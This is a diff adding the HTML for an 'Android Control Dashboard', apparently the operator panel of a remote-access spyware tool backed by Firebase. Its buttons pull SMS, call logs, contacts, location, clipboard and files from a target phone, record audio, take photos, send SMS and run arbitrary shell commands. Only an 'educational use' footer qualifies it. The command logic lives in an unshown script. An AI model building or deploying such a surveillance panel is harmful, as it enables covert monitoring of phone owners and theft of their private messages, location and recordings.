@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Android Control Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Authentication Screen -->
+    <div id="authScreen" class="auth-screen">
+        <div class="auth-container">
+            <div class="auth-card">
+                <div class="auth-header">
+                    <span class="material-icons">security</span>
+                    <h1>Android Control Dashboard</h1>
+                    <p>Secure access required</p>
+                </div>
+                <form id="authForm" class="auth-form">
+                    <div class="input-group">
+                        <input type="email" id="email" placeholder="Email" required>
+                        <span class="material-icons">email</span>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder="Password" required>
+                        <span class="material-icons">lock</span>
+                    </div>
+                    <button type="submit" class="btn-primary">
+                        <span class="material-icons">login</span>
+                        Sign In
+                    </button>
+                </form>
+                <div class="auth-footer">
+                    <p>Educational use only. Ensure proper authorization.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <div id="dashboard" class="dashboard hidden">
+        <!-- Top Bar -->
+        <header class="topbar">
+            <div class="topbar-left">
+                <button id="menuToggle" class="icon-btn">
+                    <span class="material-icons">menu</span>
+                </button>
+                <h1>Android Control Dashboard</h1>
+            </div>
+            <div class="topbar-right">
+                <div class="device-status" id="deviceStatus">
+                    <span class="status-indicator offline"></span>
+                    <span>Offline</span>
+                </div>
+                <button id="logoutBtn" class="icon-btn">
+                    <span class="material-icons">logout</span>
+                </button>
+            </div>
+        </header>
+
+        <!-- Sidebar -->
+        <nav class="sidebar" id="sidebar">
+            <div class="sidebar-header">
+                <span class="material-icons">smartphone</span>
+                <span>Device Control</span>
+            </div>
+            <ul class="sidebar-menu">
+                <li><a href="#overview" data-section="overview">
+                    <span class="material-icons">dashboard</span>
+                    Overview
+                </a></li>
+                <li><a href="#communication" data-section="communication">
+                    <span class="material-icons">message</span>
+                    Communication
+                </a></li>
+                <li><a href="#files" data-section="files">
+                    <span class="material-icons">folder</span>
+                    Files
+                </a></li>
+                <li><a href="#media" data-section="media">
+                    <span class="material-icons">photo_library</span>
+                    Media
+                </a></li>
+                <li><a href="#system" data-section="system">
+                    <span class="material-icons">settings</span>
+                    System
+                </a></li>
+                <li><a href="#logs" data-section="logs">
+                    <span class="material-icons">list_alt</span>
+                    Logs
+                </a></li>
+            </ul>
+        </nav>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Overview Section -->
+            <section id="overview" class="content-section active">
+                <div class="section-header">
+                    <h2>Device Overview</h2>
+                    <p>Monitor and control connected Android device</p>
+                </div>
+
+                <div class="cards-grid">
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">info</span>
+                            <h3>Device Information</h3>
+                        </div>
+                        <div class="card-content">
+                            <button class="btn-secondary" onclick="executeCommand('get_info')">
+                                <span class="material-icons">refresh</span>
+                                Get Device Info
+                            </button>
+                            <div id="deviceInfo" class="info-display"></div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">location_on</span>
+                            <h3>Location</h3>
+                        </div>
+                        <div class="card-content">
+                            <button class="btn-secondary" onclick="executeCommand('get_location')">
+                                <span class="material-icons">my_location</span>
+                                Get Location
+                            </button>
+                            <div id="locationInfo" class="info-display"></div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">apps</span>
+                            <h3>Applications</h3>
+                        </div>
+                        <div class="card-content">
+                            <button class="btn-secondary" onclick="executeCommand('get_apps')">
+                                <span class="material-icons">list</span>
+                                List Apps
+                            </button>
+                            <div class="input-group">
+                                <input type="text" id="appPackage" placeholder="com.example.app">
+                                <button class="btn-secondary" onclick="openApp()">
+                                    <span class="material-icons">launch</span>
+                                    Open App
+                            </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Communication Section -->
+            <section id="communication" class="content-section">
+                <div class="section-header">
+                    <h2>Communication</h2>
+                    <p>SMS, calls, and contacts management</p>
+                </div>
+
+                <div class="cards-grid">
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">sms</span>
+                            <h3>SMS Management</h3>
+                        </div>
+                        <div class="card-content">
+                            <button class="btn-secondary" onclick="executeCommand('get_sms')">
+                                <span class="material-icons">inbox</span>
+                                Get SMS
+                            </button>
+                            <div class="input-group">
+                                <input type="tel" id="smsNumber" placeholder="+1234567890">
+                                <input type="text" id="smsMessage" placeholder="Message">
+                                <button class="btn-primary" onclick="sendSMS()">
+                                    <span class="material-icons">send</span>
+                                    Send SMS
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">call</span>
+                            <h3>Call Logs</h3>
+                        </div>
+                        <div class="card-content">
+                            <button class="btn-secondary" onclick="executeCommand('get_call_logs')">
+                                <span class="material-icons">history</span>
+                                Get Call Logs
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">contacts</span>
+                            <h3>Contacts</h3>
+                        </div>
+                        <div class="card-content">
+                            <button class="btn-secondary" onclick="executeCommand('get_contacts')">
+                                <span class="material-icons">people</span>
+                                Get Contacts
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Files Section -->
+            <section id="files" class="content-section">
+                <div class="section-header">
+                    <h2>File Management</h2>
+                    <p>Browse and download files from device</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <span class="material-icons">folder</span>
+                        <h3>File Browser</h3>
+                    </div>
+                    <div class="card-content">
+                        <div class="input-group">
+                            <input type="text" id="filePath" placeholder="/sdcard/Download" value="/sdcard">
+                            <button class="btn-secondary" onclick="browseFiles()">
+                                <span class="material-icons">folder_open</span>
+                                Browse
+                            </button>
+                        </div>
+                        <div class="input-group">
+                            <input type="text" id="downloadPath" placeholder="/sdcard/file.txt">
+                            <button class="btn-primary" onclick="downloadFile()">
+                                <span class="material-icons">download</span>
+                                Download File
+                            </button>
+                        </div>
+                        <div id="fileList" class="file-list"></div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Media Section -->
+            <section id="media" class="content-section">
+                <div class="section-header">
+                    <h2>Media Control</h2>
+                    <p>Audio, photos, and media functions</p>
+                </div>
+
+                <div class="cards-grid">
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">mic</span>
+                            <h3>Audio Recording</h3>
+                        </div>
+                        <div class="card-content">
+                            <button class="btn-primary" onclick="executeCommand('record_audio')">
+                                <span class="material-icons">fiber_manual_record</span>
+                                Record Audio
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">camera_alt</span>
+                            <h3>Camera</h3>
+                        </div>
+                        <div class="card-content">
+                            <button class="btn-primary" onclick="executeCommand('take_photo')">
+                                <span class="material-icons">photo_camera</span>
+                                Take Photo
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">volume_up</span>
+                            <h3>Sound Control</h3>
+                        </div>
+                        <div class="card-content">
+                            <div class="input-group">
+                                <input type="text" id="soundUrl" placeholder="Sound URL">
+                                <button class="btn-secondary" onclick="playSound()">
+                                    <span class="material-icons">play_arrow</span>
+                                    Play Sound
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- System Section -->
+            <section id="system" class="content-section">
+                <div class="section-header">
+                    <h2>System Control</h2>
+                    <p>Device system functions and utilities</p>
+                </div>
+
+                <div class="cards-grid">
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">vibration</span>
+                            <h3>Device Functions</h3>
+                        </div>
+                        <div class="card-content">
+                            <div class="btn-group">
+                                <button class="btn-secondary" onclick="executeCommand('vibrate')">
+                                    <span class="material-icons">vibration</span>
+                                    Vibrate
+                                </button>
+                                <button class="btn-secondary" onclick="executeCommand('flash_on')">
+                                    <span class="material-icons">flashlight_on</span>
+                                    Flash On
+                                </button>
+                                <button class="btn-secondary" onclick="executeCommand('flash_off')">
+                                    <span class="material-icons">flashlight_off</span>
+                                    Flash Off
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">record_voice_over</span>
+                            <h3>Text to Speech</h3>
+                        </div>
+                        <div class="card-content">
+                            <div class="input-group">
+                                <input type="text" id="ttsText" placeholder="Text to speak">
+                                <button class="btn-primary" onclick="textToSpeech()">
+                                    <span class="material-icons">speaker</span>
+                                    Speak
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">terminal</span>
+                            <h3>Shell Commands</h3>
+                        </div>
+                        <div class="card-content">
+                            <div class="input-group">
+                                <input type="text" id="shellCommand" placeholder="ls -la">
+                                <button class="btn-primary" onclick="executeShell()">
+                                    <span class="material-icons">play_arrow</span>
+                                    Execute
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">content_paste</span>
+                            <h3>Clipboard</h3>
+                        </div>
+                        <div class="card-content">
+                            <button class="btn-secondary" onclick="executeCommand('get_clipboard')">
+                                <span class="material-icons">content_copy</span>
+                                Get Clipboard
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <span class="material-icons">open_in_browser</span>
+                            <h3>Open URL</h3>
+                        </div>
+                        <div class="card-content">
+                            <div class="input-group">
+                                <input type="url" id="openUrl" placeholder="https://example.com">
+                                <button class="btn-primary" onclick="openURL()">
+                                    <span class="material-icons">launch</span>
+                                    Open
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Logs Section -->
+            <section id="logs" class="content-section">
+                <div class="section-header">
+                    <h2>Activity Logs</h2>
+                    <p>Real-time command results and device logs</p>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <span class="material-icons">list_alt</span>
+                        <h3>Command Logs</h3>
+                        <button class="btn-secondary" onclick="clearLogs()">
+                            <span class="material-icons">clear</span>
+                            Clear
+                        </button>
+                    </div>
+                    <div class="card-content">
+                        <div id="logsList" class="logs-container"></div>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay hidden">
+        <div class="loading-spinner">
+            <div class="spinner"></div>
+            <p>Processing command...</p>
+        </div>
+    </div>
+
+    <!-- Toast Container -->
+    <div id="toastContainer" class="toast-container"></div>
+
+    <!-- Scripts -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    <script src="firebase-config.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
